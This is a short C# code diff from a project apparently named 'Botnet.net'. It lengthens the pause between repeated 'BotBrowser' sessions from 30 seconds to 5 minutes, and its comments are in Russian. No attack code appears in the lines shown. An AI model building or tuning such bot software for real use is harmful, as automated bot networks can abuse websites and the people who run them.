@@ -26,7 +26,7 @@ namespace Botnet.net
                     BotBrowser bot = new BotBrowser();//Инициализация бота
                     Application.Run(bot);
                 }
-                Thread.Sleep(30000);//Задержка между сеансами в пол минуты
+                Thread.Sleep(60 * 1000 * 5);//Задержка между сеансами 5 минут
             }
         }
     }
